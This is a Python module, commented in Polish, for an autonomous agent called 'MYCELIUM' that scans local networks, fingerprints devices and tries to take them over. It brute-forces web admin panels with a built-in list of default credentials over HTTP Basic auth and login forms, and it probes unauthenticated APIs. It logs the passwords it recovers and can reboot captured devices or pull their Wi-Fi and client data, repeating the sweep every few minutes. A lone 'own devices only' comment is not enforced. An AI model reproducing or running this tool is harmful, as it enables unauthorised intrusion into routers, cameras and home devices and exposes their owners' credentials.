"""
🍄 MYCELIUM — AI Agent (Autonomiczny Łowca Urządzeń)
Inteligentny silnik który autonomicznie wykrywa, klasyfikuje i przejmuje kontrolę
nad urządzeniami dostępnymi przez sieć (LAN + Powerline).

UWAGA: Używaj TYLKO na własnych urządzeniach i sieciach.
"""

import json
import os
import socket
import time
import platform
import subprocess
import threading
import urllib.request
import urllib.error
import urllib.parse
import ssl
import base64
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from queue import Queue, Empty


# ─────────────────────────────────────────────────────────────────────────────
# DOMYŚLNE DANE LOGOWANIA — popularne dla urządzeń sieciowych/powerline
# (Używaj TYLKO na własnych urządzeniach!)
# ─────────────────────────────────────────────────────────────────────────────

DEFAULT_CREDENTIALS = [
    ("admin",    "admin"),
    ("admin",    "password"),
    ("admin",    "1234"),
    ("admin",    "12345"),
    ("admin",    "123456"),
    ("admin",    ""),
    ("root",     "root"),
    ("root",     "admin"),
    ("root",     ""),
    ("user",     "user"),
    ("admin",    "Admin"),
    ("Admin",    "Admin"),
    # devolo specyficzne
    ("admin",    "devolo"),
    # TP-Link specyficzne
    ("admin",    "tp-link"),
    ("admin",    "tplink"),
    # Routery
    ("admin",    "router"),
    ("admin",    "gateway"),
]

# ─────────────────────────────────────────────────────────────────────────────
# ŚCIEŻKI PANELI ZARZĄDZANIA — sprawdzamy na każdym urządzeniu
# ─────────────────────────────────────────────────────────────────────────────

ADMIN_PATHS = [
    "/",
    "/index.html",
    "/index.htm",
    "/admin",
    "/admin/",
    "/login",
    "/login.html",
    "/login.htm",
    "/management",
    "/cgi-bin/luci/",          # OpenWrt/LEDE
    "/cgi-bin/login.cgi",
    "/cgi-bin/main.cgi",
    "/web/",                    # devolo
    "/api/v1/",
    "/api/system/",
    "/userRpm/",                # TP-Link
    "/HNAP1/",                  # D-Link HNAP
    "/setup.cgi",
]

# ─────────────────────────────────────────────────────────────────────────────
# FINGERPRINTING — rozpoznawanie urządzeń po odpowiedziach HTTP
# ─────────────────────────────────────────────────────────────────────────────

DEVICE_FINGERPRINTS = {
    "tp_link_powerline": {
        "keywords": ["tp-link", "tl-pa", "tl-wpa", "powerline", "av1000", "av600", "av500"],
        "emoji": "⚡",
        "category": "powerline",
        "vendor": "TP-Link",
    },
    "devolo_powerline": {
        "keywords": ["devolo", "dlan", "d-lan", "magic 2", "magic2"],
        "emoji": "⚡",
        "category": "powerline",
        "vendor": "devolo",
    },
    "openwrt": {
        "keywords": ["openwrt", "lede", "luci", "opkg"],
        "emoji": "🐧",
        "category": "router",
        "vendor": "OpenWrt",
    },
    "router_generic": {
        "keywords": ["wireless router", "wi-fi router", "gateway", "router setup",
                     "internet gateway", "dsl modem"],
        "emoji": "🌐",
        "category": "router",
        "vendor": "Generic",
    },
    "nas": {
        "keywords": ["synology", "qnap", "nas", "diskstation", "network attached storage",
                     "dsm", "qts"],
        "emoji": "💾",
        "category": "storage",
        "vendor": "NAS",
    },
    "camera": {
        "keywords": ["ip camera", "ipcam", "network camera", "webcam", "hikvision",
                     "dahua", "axis", "foscam", "rtsp", "onvif"],
        "emoji": "📷",
        "category": "camera",
        "vendor": "IP Camera",
    },
    "smart_home": {
        "keywords": ["philips hue", "hue bridge", "zigbee", "z-wave", "homeassistant",
                     "home assistant", "domoticz", "homey"],
        "emoji": "🏠",
        "category": "smart_home",
        "vendor": "Smart Home",
    },
    "printer": {
        "keywords": ["printer", "jetdirect", "cups", "ipp", "hewlett-packard",
                     "brother mfc", "epson", "canon"],
        "emoji": "🖨️",
        "category": "printer",
        "vendor": "Printer",
    },
    "media": {
        "keywords": ["plex", "kodi", "dlna", "upnp av", "media server",
                     "chromecast", "roku", "fire tv", "apple tv"],
        "emoji": "📺",
        "category": "media",
        "vendor": "Media",
    },
}


# ─────────────────────────────────────────────────────────────────────────────
# KLASA: AcquireResult — wynik próby przejęcia urządzenia
# ─────────────────────────────────────────────────────────────────────────────

class AcquireResult:
    def __init__(self, ip: str):
        self.ip = ip
        self.success = False
        self.method = None          # "http_auth", "api_token", "open_interface", "ssh"
        self.credentials = None     # (user, pass) jeśli znaleziono
        self.admin_url = None       # URL do panelu admin
        self.device_info = {}       # Zebrany profil urządzenia
        self.capabilities = []      # Co można zrobić z urządzeniem
        self.error = None
        self.timestamp = datetime.now().isoformat()

    def to_dict(self) -> Dict:
        return {
            "ip": self.ip,
            "success": self.success,
            "method": self.method,
            "credentials": list(self.credentials) if self.credentials else None,
            "admin_url": self.admin_url,
            "device_info": self.device_info,
            "capabilities": self.capabilities,
            "error": self.error,
            "timestamp": self.timestamp,
        }


# ─────────────────────────────────────────────────────────────────────────────
# KLASA: DeviceProfile — pełny profil odkrytego urządzenia
# ─────────────────────────────────────────────────────────────────────────────

class DeviceProfile:
    def __init__(self, ip: str):
        self.ip = ip
        self.mac: Optional[str] = None
        self.hostname: Optional[str] = None
        self.os_guess: Optional[str] = None
        self.vendor: Optional[str] = None
        self.model: Optional[str] = None
        self.category: str = "unknown"
        self.emoji: str = "❓"
        self.open_ports: List[int] = []
        self.services: Dict[int, str] = {}   # port → service_name
        self.web_interfaces: List[Dict] = [] # znalezione interfejsy web
        self.acquired: bool = False
        self.acquire_result: Optional[AcquireResult] = None
        self.last_seen: str = datetime.now().isoformat()
        self.powerline: bool = False
        self.powerline_confidence: int = 0
        self.notes: List[str] = []

    def to_dict(self) -> Dict:
        return {
            "ip": self.ip,
            "mac": self.mac,
            "hostname": self.hostname,
            "os_guess": self.os_guess,
            "vendor": self.vendor,
            "model": self.model,
            "category": self.category,
            "emoji": self.emoji,
            "open_ports": self.open_ports,
            "services": self.services,
            "web_interfaces": self.web_interfaces,
            "acquired": self.acquired,
            "acquire_result": self.acquire_result.to_dict() if self.acquire_result else None,
            "last_seen": self.last_seen,
            "powerline": self.powerline,
            "powerline_confidence": self.powerline_confidence,
            "notes": self.notes,
            "name": f"{self.vendor or 'Urządzenie'} ({self.ip})",
        }


# ─────────────────────────────────────────────────────────────────────────────
# KLASA: MycelliumAI — główny silnik AI
# ─────────────────────────────────────────────────────────────────────────────

class MycelliumAI:
    """
    Autonomiczny agent AI który:
    1. Skanuje sieć (LAN + Powerline)
    2. Profiluje każde urządzenie
    3. Próbuje uzyskać dostęp (domyślne hasła, otwarte interfejsy)
    4. Buduje mapę grzybni
    5. Raportuje co znalazł
    """

    def __init__(self, data_dir: str = None):
        self.data_dir = data_dir or os.path.join(
            os.path.dirname(os.path.dirname(__file__)), "data"
        )
        os.makedirs(self.data_dir, exist_ok=True)
        self.profiles: Dict[str, DeviceProfile] = {}
        self.action_log: List[Dict] = []
        self.running = False
        self._lock = threading.Lock()
        self._load_profiles()

    # ═══════════════════════════════════════════════════════════
    # SKANOWANIE PORTÓW
    # ═══════════════════════════════════════════════════════════

    def scan_ports(self, ip: str, ports: List[int] = None, timeout: float = 0.8) -> List[int]:
        """Szybkie skanowanie portów TCP na urządzeniu."""
        if ports is None:
            ports = [
                21,    # FTP
                22,    # SSH
                23,    # Telnet
                25,    # SMTP
                53,    # DNS
                80,    # HTTP
                443,   # HTTPS
                445,   # SMB
                554,   # RTSP (kamery)
                1080,  # devolo
                3000,  # API
                3306,  # MySQL
                5000,  # Flask/API
                7547,  # TR-069
                8080,  # HTTP alt
                8443,  # HTTPS alt
                8888,  # HTTP alt
                9000,  # API
                9999,  # TP-Link
                49152, # UPnP
            ]

        open_ports = []
        with threading.Lock():
            threads = []
            results = []

            def check_port(p):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    r = s.connect_ex((ip, p))
                    s.close()
                    if r == 0:
                        results.append(p)
                except:
                    pass

            for port in ports:
                t = threading.Thread(target=check_port, args=(port,), daemon=True)
                threads.append(t)
                t.start()

            for t in threads:
                t.join(timeout=timeout + 0.2)

        return sorted(results)

    def identify_services(self, ip: str, open_ports: List[int]) -> Dict[int, str]:
        """Identyfikuje usługi na otwartych portach przez banner grabbing."""
        services = {}
        port_names = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
            53: "DNS", 80: "HTTP", 443: "HTTPS", 445: "SMB",
            554: "RTSP", 1080: "Socks/Proxy", 3306: "MySQL",
            5000: "Flask/API", 7547: "TR-069", 8080: "HTTP-alt",
            8443: "HTTPS-alt", 9999: "TP-Link-mgmt", 49152: "UPnP",
            1900: "SSDP",
        }
        for port in open_ports:
            services[port] = port_names.get(port, f"port-{port}")
        return services

    # ═══════════════════════════════════════════════════════════
    # FINGERPRINTING URZĄDZENIA
    # ═══════════════════════════════════════════════════════════

    def fingerprint_http(self, ip: str, port: int = 80) -> Optional[Dict]:
        """
        Pobiera stronę zarządzania i analizuje zawartość.
        Zwraca profil urządzenia lub None.
        """
        protocol = "https" if port == 443 else "http"
        ctx = None
        if protocol == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        for path in ADMIN_PATHS[:5]:  # Sprawdź pierwsze 5 ścieżek
            url = f"{protocol}://{ip}:{port}{path}"
            try:
                req = urllib.request.Request(
                    url,
                    headers={
                        "User-Agent": "Mozilla/5.0 (Mycelium Agent/2.0)",
                        "Accept": "text/html,*/*",
                    }
                )
                with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                    body = resp.read(4096).decode("utf-8", errors="ignore")
                    server = resp.headers.get("Server", "")
                    content_type = resp.headers.get("Content-Type", "")
                    status = resp.status

                    result = {
                        "url": url,
                        "status": status,
                        "server": server,
                        "content_type": content_type,
                        "body_preview": body[:300],
                        "requires_auth": status == 401,
                        "fingerprint": None,
                        "vendor": None,
                    }

                    # Fingerprinting po treści
                    body_lower = body.lower() + server.lower()
                    for fp_name, fp_data in DEVICE_FINGERPRINTS.items():
                        for kw in fp_data["keywords"]:
                            if kw in body_lower:
                                result["fingerprint"] = fp_name
                                result["vendor"] = fp_data["vendor"]
                                result["emoji"] = fp_data["emoji"]
                                result["category"] = fp_data["category"]
                                result["matched_keyword"] = kw
                                break
                        if result["fingerprint"]:
                            break

                    return result

            except urllib.error.HTTPError as e:
                if e.code == 401:
                    return {
                        "url": url,
                        "status": 401,
                        "server": e.headers.get("Server", ""),
                        "requires_auth": True,
                        "auth_realm": e.headers.get("WWW-Authenticate", ""),
                        "fingerprint": None,
                    }
                continue
            except Exception:
                continue

        return None

    # ═══════════════════════════════════════════════════════════
    # PRZEJĘCIE URZĄDZENIA — próba logowania
    # ═══════════════════════════════════════════════════════════

    def try_acquire_http(self, ip: str, port: int = 80) -> AcquireResult:
        """
        Próbuje uzyskać dostęp do webowego panelu zarządzania
        używając domyślnych danych logowania.
        """
        result = AcquireResult(ip)
        protocol = "https" if port == 443 else "http"
        ctx = None
        if protocol == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        # 1. Sprawdź czy interfejs jest otwarty bez logowania
        for path in ADMIN_PATHS:
            url = f"{protocol}://{ip}:{port}{path}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mycelium/2.0"})
                with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                    if resp.status == 200:
                        body = resp.read(2048).decode("utf-8", errors="ignore")
                        # Sprawdź czy to rzeczywiście panel admin (nie strona błędu)
                        admin_keywords = ["admin", "management", "configuration",
                                          "settings", "dashboard", "router",
                                          "powerline", "devolo", "tp-link", "login",
                                          "username", "password", "setup"]
                        body_lower = body.lower()
                        if any(kw in body_lower for kw in admin_keywords):
                            result.success = True
                            result.method = "open_interface"
                            result.admin_url = url
                            result.device_info = {
                                "body_preview": body[:200],
                                "server": resp.headers.get("Server", ""),
                            }
                            result.capabilities = ["web_access", "monitoring"]
                            return result
            except:
                continue

        # 2. Próbuj HTTP Basic Auth z domyślnymi hasłami
        for username, password in DEFAULT_CREDENTIALS:
            credentials = f"{username}:{password}"
            b64 = base64.b64encode(credentials.encode()).decode()

            for path in ["/", "/admin", "/admin/", "/cgi-bin/luci/", "/web/"]:
                url = f"{protocol}://{ip}:{port}{path}"
                try:
                    req = urllib.request.Request(url)
                    req.add_header("Authorization", f"Basic {b64}")
                    req.add_header("User-Agent", "Mycelium/2.0")
                    with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                        if resp.status == 200:
                            body = resp.read(1024).decode("utf-8", errors="ignore")
                            result.success = True
                            result.method = "http_basic_auth"
                            result.credentials = (username, password)
                            result.admin_url = url
                            result.device_info = {
                                "body_preview": body[:200],
                                "server": resp.headers.get("Server", ""),
                            }
                            result.capabilities = ["web_access", "configuration", "monitoring"]
                            return result
                except urllib.error.HTTPError as e:
                    if e.code == 401:
                        continue  # Złe hasło, spróbuj następne
                    continue
                except:
                    continue

        # 3. Próbuj formularz logowania (POST)
        for username, password in DEFAULT_CREDENTIALS[:8]:
            for path in ["/login", "/login.cgi", "/cgi-bin/login.cgi", "/admin/login"]:
                url = f"{protocol}://{ip}:{port}{path}"
                for payload_template in [
                    f"username={username}&password={password}",
                    f"user={username}&pass={password}",
                    f"admin_name={username}&admin_pass={password}",
                    f"login={username}&passwd={password}",
                ]:
                    try:
                        data = payload_template.encode()
                        req = urllib.request.Request(
                            url, data=data,
                            headers={
                                "Content-Type": "application/x-www-form-urlencoded",
                                "User-Agent": "Mycelium/2.0",
                            }
                        )
                        with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                            if resp.status == 200:
                                body = resp.read(1024).decode("utf-8", errors="ignore")
                                body_lower = body.lower()
                                # Sprawdź czy logowanie się udało (brak "error", "invalid", "wrong")
                                if not any(w in body_lower for w in
                                           ["invalid", "incorrect", "failed", "error", "wrong password"]):
                                    result.success = True
                                    result.method = "http_form_post"
                                    result.credentials = (username, password)
                                    result.admin_url = url
                                    result.device_info = {"body_preview": body[:200]}
                                    result.capabilities = ["web_access", "configuration"]
                                    return result
                    except:
                        continue

        result.error = "Nie udało się uzyskać dostępu (wyczerpano domyślne hasła)"
        return result

    def try_acquire_api(self, ip: str, port: int = 80) -> AcquireResult:
        """Próbuje połączyć się przez REST API (Home Assistant, Hue, inne)."""
        result = AcquireResult(ip)
        protocol = "https" if port == 443 else "http"
        ctx = None
        if protocol == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        api_endpoints = [
            "/api/",
            "/api/v1/",
            "/api/system",
            "/api/info",
            "/status",
            "/api/lights",      # Philips Hue
            "/api/0/lights",    # Hue bez auth
        ]

        for endpoint in api_endpoints:
            url = f"{protocol}://{ip}:{port}{endpoint}"
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mycelium/2.0"})
                with urllib.request.urlopen(req, timeout=3.0, context=ctx) as resp:
                    if resp.status == 200:
                        body = resp.read(4096).decode("utf-8", errors="ignore")
                        try:
                            data = json.loads(body)
                            result.success = True
                            result.method = "open_api"
                            result.admin_url = url
                            result.device_info = {
                                "api_response": str(data)[:300],
                                "endpoint": endpoint,
                            }
                            result.capabilities = ["api_access", "monitoring"]
                            return result
                        except:
                            pass
            except:
                continue

        result.error = "Brak otwartego API"
        return result

    # ═══════════════════════════════════════════════════════════
    # GŁÓWNA FUNKCJA: PROFILOWANIE I PRZEJĘCIE
    # ═══════════════════════════════════════════════════════════

    def profile_and_acquire(self, ip: str, mac: str = None,
                            hostname: str = None,
                            existing_ports: List[int] = None) -> DeviceProfile:
        """
        Pełny cykl: skanuj → profiluj → przejmij.
        To jest serce AI agenta.
        """
        self._log(f"🔍 Profiluję {ip}...")
        profile = DeviceProfile(ip)
        profile.mac = mac
        profile.hostname = hostname

        # 1. Skanuj porty
        open_ports = existing_ports or self.scan_ports(ip)
        profile.open_ports = open_ports
        profile.services = self.identify_services(ip, open_ports)
        self._log(f"  📡 {ip} — otwarte porty: {open_ports}")

        # 2. Fingerprinting przez HTTP
        web_ports = [p for p in open_ports if p in [80, 8080, 443, 8443, 9999, 1080, 3000]]
        for wp in web_ports[:3]:  # max 3 porty web
            fp = self.fingerprint_http(ip, wp)
            if fp:
                profile.web_interfaces.append(fp)
                if fp.get("fingerprint"):
                    fp_data = DEVICE_FINGERPRINTS.get(fp["fingerprint"], {})
                    profile.vendor = fp.get("vendor", fp_data.get("vendor"))
                    profile.category = fp.get("category", fp_data.get("category", "network"))
                    profile.emoji = fp.get("emoji", fp_data.get("emoji", "🌐"))
                    self._log(f"  🔬 {ip} — fingerprint: {fp.get('fingerprint')} ({fp.get('matched_keyword', '')})")
                break

        # 3. Wykryj Powerline po MAC
        if mac:
            from scanner.powerline import identify_powerline_by_mac
            pl = identify_powerline_by_mac(mac)
            if pl:
                profile.powerline = True
                profile.powerline_confidence = 90
                profile.vendor = pl["vendor"]
                profile.model = pl["model"]
                profile.category = "powerline"
                profile.emoji = "⚡"
                self._log(f"  ⚡ {ip} — adapter Powerline: {pl['vendor']} {pl['model']}")

        # 4. Próba przejęcia
        if web_ports:
            self._log(f"  🎯 {ip} — próbuję przejąć przez HTTP (port {web_ports[0]})...")
            acquire_result = self.try_acquire_http(ip, web_ports[0])

            # Jeśli HTTP Basic nie zadziałało, spróbuj API
            if not acquire_result.success:
                acquire_result = self.try_acquire_api(ip, web_ports[0])

            profile.acquired = acquire_result.success
            profile.acquire_result = acquire_result

            if acquire_result.success:
                self._log(
                    f"  ✅ {ip} — PRZEJĘTO! Metoda: {acquire_result.method} "
                    f"| Hasło: {acquire_result.credentials}"
                )
                profile.notes.append(
                    f"Przejęto przez {acquire_result.method} "
                    f"— użytkownik: {acquire_result.credentials}"
                )
            else:
                self._log(f"  ❌ {ip} — nie udało się przejąć")

        # 5. Zapisz profil
        with self._lock:
            self.profiles[ip] = profile
        self._save_profiles()

        return profile

    # ═══════════════════════════════════════════════════════════
    # SKANOWANIE SIECI ELEKTRYCZNEJ
    # ═══════════════════════════════════════════════════════════

    def hunt_powerline_network(self, network_devices: List[Dict]) -> List[DeviceProfile]:
        """
        Specjalizowany łowca urządzeń przez sieć elektryczną.
        Analizuje już odkryte urządzenia + szuka nowych przez UPnP/mDNS.
        """
        self._log("⚡ HUNT: Rozpoczynam polowanie na urządzenia przez sieć elektryczną...")
        results = []

        # Profiluj każde urządzenie z sieci
        for dev in network_devices:
            ip = dev.get("ip", "")
            if not ip:
                continue
            mac = dev.get("mac", "")
            hostname = dev.get("hostname", "")
            ports = dev.get("open_ports", [])

            profile = self.profile_and_acquire(ip, mac, hostname, ports)
            results.append(profile)

        # Dodatkowe skanowanie UPnP po urządzeniach Powerline
        from scanner.powerline import scan_upnp_powerline
        self._log("⚡ HUNT: Szukam adapterów przez UPnP...")
        upnp_devices = scan_upnp_powerline(timeout=4.0)
        known_ips = {d.get("ip") for d in network_devices}

        for ud in upnp_devices:
            ip = ud.get("ip", "")
            if ip and ip not in known_ips:
                self._log(f"⚡ HUNT: Nowe urządzenie UPnP: {ip}")
                profile = self.profile_and_acquire(ip)
                results.append(profile)

        acquired = [p for p in results if p.acquired]
        self._log(
            f"⚡ HUNT: Zakończono. "
            f"Przeanalizowano: {len(results)}, Przejęto: {len(acquired)}"
        )
        return results

    # ═══════════════════════════════════════════════════════════
    # CIĄGŁE MONITOROWANIE (tryb autonomiczny)
    # ═══════════════════════════════════════════════════════════

    def start_autonomous_mode(self, scan_interval: int = 300):
        """
        Uruchamia AI agenta w trybie ciągłego monitorowania.
        Co `scan_interval` sekund skanuje sieć i szuka nowych urządzeń.
        """
        self.running = True
        self._log(f"🍄 AI Agent uruchomiony — skanowanie co {scan_interval}s")

        def loop():
            while self.running:
                try:
                    from scanner.network import scan_network
                    devices = scan_network()
                    self.hunt_powerline_network(devices)
                except Exception as e:
                    self._log(f"⚠️ Błąd w trybie autonomicznym: {e}")
                time.sleep(scan_interval)

        t = threading.Thread(target=loop, daemon=True)
        t.start()
        return t

    def stop_autonomous_mode(self):
        self.running = False
        self._log("🍄 AI Agent zatrzymany")

    # ═══════════════════════════════════════════════════════════
    # AKCJE NA PRZEJĘTYCH URZĄDZENIACH
    # ═══════════════════════════════════════════════════════════

    def execute_on_device(self, ip: str, action: str, params: Dict = None) -> Dict:
        """
        Wykonuje akcję na przejętym urządzeniu.
        Dostępne akcje zależą od tego jak urządzenie zostało przejęte.
        """
        params = params or {}
        profile = self.profiles.get(ip)
        if not profile:
            return {"error": f"Brak profilu dla {ip}"}

        if not profile.acquired:
            return {"error": f"Urządzenie {ip} nie zostało przejęte"}

        ar = profile.acquire_result
        self._log(f"🎯 Wykonuję akcję '{action}' na {ip}...")

        if action == "get_system_info":
            return self._get_system_info(ip, ar)

        elif action == "list_devices":
            # Dla adapterów Powerline — lista podłączonych urządzeń PLC
            return self._list_powerline_devices(ip, ar)

        elif action == "get_wifi_info":
            return self._get_wifi_info(ip, ar)

        elif action == "reboot":
            return self._reboot_device(ip, ar)

        elif action == "get_connected_clients":
            return self._get_connected_clients(ip, ar)

        elif action == "http_get":
            path = params.get("path", "/")
            return self._authenticated_get(ip, ar, path)

        return {"error": f"Nieznana akcja: {action}"}

    def _authenticated_get(self, ip: str, ar: AcquireResult, path: str) -> Dict:
        """Wykonuje uwierzytelniony GET na przejętym urządzeniu."""
        if not ar.admin_url:
            return {"error": "Brak URL panelu admin"}

        base = ar.admin_url.rsplit("/", 1)[0] if "/" in ar.admin_url else ar.admin_url
        url = f"{base}{path}"
        ctx = None
        if url.startswith("https"):
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mycelium/2.0"})
            if ar.credentials and ar.method == "http_basic_auth":
                b64 = base64.b64encode(f"{ar.credentials[0]}:{ar.credentials[1]}".encode()).decode()
                req.add_header("Authorization", f"Basic {b64}")
            with urllib.request.urlopen(req, timeout=5.0, context=ctx) as resp:
                body = resp.read(8192).decode("utf-8", errors="ignore")
                return {"status": resp.status, "url": url, "body": body[:500]}
        except Exception as e:
            return {"error": str(e)}

    def _get_system_info(self, ip: str, ar: AcquireResult) -> Dict:
        paths = ["/api/system", "/api/info", "/cgi-bin/main.cgi", "/status"]
        for path in paths:
            result = self._authenticated_get(ip, ar, path)
            if result.get("status") == 200:
                return result
        return {"ip": ip, "acquired": True, "method": ar.method, "url": ar.admin_url}

    def _list_powerline_devices(self, ip: str, ar: AcquireResult) -> Dict:
        """Pobiera listę urządzeń PLC podłączonych przez sieć elektryczną."""
        paths = [
            "/web/",
            "/api/plc/devices",
            "/cgi-bin/plc.cgi",
            "/userRpm/PowerlineStatus.htm",  # TP-Link
        ]
        for path in paths:
            result = self._authenticated_get(ip, ar, path)
            if result.get("status") == 200:
                return result
        return {"error": "Nie znaleziono listy urządzeń PLC"}

    def _get_wifi_info(self, ip: str, ar: AcquireResult) -> Dict:
        paths = ["/api/wifi", "/cgi-bin/wifi.cgi", "/userRpm/WlanNetworkRpm.htm"]
        for path in paths:
            result = self._authenticated_get(ip, ar, path)
            if result.get("status") == 200:
                return result
        return {"error": "Nie znaleziono informacji Wi-Fi"}

    def _reboot_device(self, ip: str, ar: AcquireResult) -> Dict:
        """Restartuje urządzenie — tylko na własnych urządzeniach!"""
        paths = ["/api/system/reboot", "/cgi-bin/reboot.cgi", "/reboot"]
        for path in paths:
            url = ar.admin_url.split("/")[0] + "//" + ip + path if ar.admin_url else f"http://{ip}{path}"
            try:
                req = urllib.request.Request(url, data=b"", method="POST",
                                             headers={"User-Agent": "Mycelium/2.0"})
                if ar.credentials:
                    b64 = base64.b64encode(f"{ar.credentials[0]}:{ar.credentials[1]}".encode()).decode()
                    req.add_header("Authorization", f"Basic {b64}")
                with urllib.request.urlopen(req, timeout=5.0) as resp:
                    if resp.status in [200, 202]:
                        return {"status": "reboot_sent", "url": url}
            except:
                continue
        return {"error": "Nie udało się wysłać komendy reboot"}

    def _get_connected_clients(self, ip: str, ar: AcquireResult) -> Dict:
        paths = ["/api/clients", "/cgi-bin/clients.cgi", "/userRpm/AssignedIpAddrListRpm.htm"]
        for path in paths:
            result = self._authenticated_get(ip, ar, path)
            if result.get("status") == 200:
                return result
        return {"error": "Nie znaleziono listy klientów"}

    # ═══════════════════════════════════════════════════════════
    # RAPORTOWANIE
    # ═══════════════════════════════════════════════════════════

    def get_summary(self) -> Dict:
        """Zwraca podsumowanie odkrytych i przejętych urządzeń."""
        profiles = list(self.profiles.values())
        acquired = [p for p in profiles if p.acquired]
        powerline = [p for p in profiles if p.powerline]

        by_category = {}
        for p in profiles:
            cat = p.category
            by_category.setdefault(cat, []).append(p.ip)

        return {
            "total_devices": len(profiles),
            "acquired": len(acquired),
            "powerline_devices": len(powerline),
            "by_category": {k: len(v) for k, v in by_category.items()},
            "acquired_list": [
                {
                    "ip": p.ip,
                    "vendor": p.vendor,
                    "method": p.acquire_result.method if p.acquire_result else None,
                    "url": p.acquire_result.admin_url if p.acquire_result else None,
                    "credentials": list(p.acquire_result.credentials)
                    if p.acquire_result and p.acquire_result.credentials else None,
                }
                for p in acquired
            ],
            "action_log": self.action_log[-20:],  # Ostatnie 20 akcji
        }

    def get_profiles_as_devices(self) -> List[Dict]:
        """Konwertuje profile AI na format kompatybilny z MycelliumAgent."""
        result = []
        for profile in self.profiles.values():
            d = profile.to_dict()
            # Dodaj flagi dla dashboardu
            d["ai_profiled"] = True
            d["acquired"] = profile.acquired
            if profile.acquired and profile.acquire_result:
                d["acquire_method"] = profile.acquire_result.method
                d["acquire_url"] = profile.acquire_result.admin_url
            result.append(d)
        return result

    # ═══════════════════════════════════════════════════════════
    # LOGI I PERSYSTENCJA
    # ═══════════════════════════════════════════════════════════

    def _log(self, message: str):
        entry = {
            "time": datetime.now().strftime("%H:%M:%S"),
            "msg": message,
        }
        print(f"[AI] {entry['time']} {message}")
        with self._lock:
            self.action_log.append(entry)
            if len(self.action_log) > 500:
                self.action_log = self.action_log[-500:]

    def _save_profiles(self):
        path = os.path.join(self.data_dir, "ai_profiles.json")
        try:
            data = {
                "updated_at": datetime.now().isoformat(),
                "profiles": {ip: p.to_dict() for ip, p in self.profiles.items()},
            }
            with open(path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            self._log(f"⚠️ Błąd zapisu profili: {e}")

    def _load_profiles(self):
        path = os.path.join(self.data_dir, "ai_profiles.json")
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                count = len(data.get("profiles", {}))
                print(f"[AI] Wczytano {count} profili AI z dysku")
            except Exception:
                pass

    def get_logs(self, last_n: int = 50) -> List[Dict]:
        return self.action_log[-last_n:]


# ─────────────────────────────────────────────────────────────────────────────
# Singleton — jedna instancja na cały proces
# ─────────────────────────────────────────────────────────────────────────────
_ai_instance: Optional[MycelliumAI] = None

def get_ai() -> MycelliumAI:
    global _ai_instance
    if _ai_instance is None:
        _ai_instance = MycelliumAI()
    return _ai_instance
